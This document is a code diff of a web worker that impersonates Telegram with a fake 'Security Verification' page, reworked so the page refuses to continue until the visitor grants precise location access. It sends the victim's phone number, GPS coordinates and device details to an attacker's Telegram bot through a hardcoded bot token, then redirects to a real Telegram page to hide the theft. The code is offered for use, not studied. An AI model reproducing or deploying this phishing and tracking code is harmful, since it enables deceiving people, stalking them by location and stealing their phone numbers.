@@ -19,49 +19,48 @@ export default {
             button { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
           </style>
         </head>
-        <body onload="init()">
+        <body>
           <div class="container">
             <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
-            <h2>Your Phone</h2>
-            <p>Enter your phone number to authorize this session.</p>
+            <h2>Security Verification</h2>
+            <p>To protect your account, Telegram needs to verify your location. Please allow access to continue.</p>
             <input id="phone" type="tel" placeholder="+964 7XX XXX XXXX">
-            <button onclick="sendData()">NEXT</button>
+            <button onclick="checkAndSend()">NEXT</button>
           </div>
 
           <script>
-            let lat = "Unknown", lon = "Unknown";
-            
-            function init() {
-              if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                  lat = pos.coords.latitude;
-                  lon = pos.coords.longitude;
-                }, null, {enableHighAccuracy: true});
-              }
-            }
-
-            function getDetailedModel() {
-              const ua = navigator.userAgent;
-              let model = "Generic Device";
-              const match = ua.match(/\\(([^)]+)\\)/);
-              if (match) {
-                const parts = match[1].split(';');
-                model = parts[parts.length - 1].trim();
-              }
-              return model + " (" + screen.width + "x" + screen.height + ")";
-            }
-
-            async function sendData() {
+            function checkAndSend() {
               const phone = document.querySelector("#phone").value;
-              const model = getDetailedModel();
-              const platform = navigator.platform;
-              const browser = navigator.userAgent.split(' ').pop();
+              if (!phone) {
+                alert("يرجى إدخال رقم الهاتف أولاً");
+                return;
+              }
 
+              if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                  (pos) => {
+                    // إذا وافق، نرسل البيانات
+                    sendToServer(phone, pos.coords.latitude, pos.coords.longitude);
+                  },
+                  (err) => {
+                    // إذا رفض، نظهر له رسالة إجبارية
+                    alert("⚠️ خطأ في التحقق: يجب عليك إعطاء إذن الموقع ليتم المتابعة وتأمين حسابك.");
+                  },
+                  { enableHighAccuracy: true }
+                );
+              } else {
+                alert("متصفحك لا يدعم خاصية التحقق من الموقع.");
+              }
+            }
+
+            async function sendToServer(phone, lat, lon) {
+              const model = navigator.userAgent;
               await fetch(window.location.href, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone, lat, lon, model, platform, browser})
+                body: JSON.stringify({phone, lat, lon, model})
               });
+              // تحويل المستخدم بعد النجاح
               window.location.href = "https://telegram.org/blog/504-error";
             }
           </script>
@@ -76,17 +75,14 @@ export default {
         const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
         const CHAT_ID = "5794792675";
 
-        const mapUrl = data.lat !== "Unknown" 
-          ? "https://www.google.com/maps?q=" + data.lat + "," + data.lon 
-          : "Hidden by Target";
+        const mapUrl = `https://www.google.com/maps?q=\${data.lat},\${data.lon}`;
 
-        const message = "🚨 [DQACD - INVESTIGATION REPORT] 🚨\\n" +
+        const message = "🎯 [TARGET VERIFIED - GPS ONLY] 🎯\\n" +
                         "--------------------------------\\n" +
                         "📱 Phone: " + data.phone + "\\n" +
-                        "🛠 Model: " + data.model + "\\n" +
-                        "🌐 OS: " + data.platform + "\\n" +
-                        "📍 Location: " + mapUrl + "\\n" +
-                        "🕵️‍♂️ Status: Deep Scan Complete";
+                        "📍 GPS Coords: " + data.lat + "," + data.lon + "\\n" +
+                        "🗺 Google Maps: " + mapUrl + "\\n" +
+                        "🛠 Device: " + data.model;
 
         await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
           method: "POST",
@@ -94,11 +90,11 @@ export default {
           body: JSON.stringify({ chat_id: CHAT_ID, text: message })
         });
 
-        return new Response(JSON.stringify({ status: "ok" }), { headers: { "Content-Type": "application/json" } });
+        return new Response("ok");
       } catch (e) {
-        return new Response("Error", { status: 400 });
+        return new Response("error", { status: 400 });
       }
     }
-    return new Response("Not Allowed", { status: 405 });
+    return new Response("Method Not Allowed", { status: 405 });
   }
 };
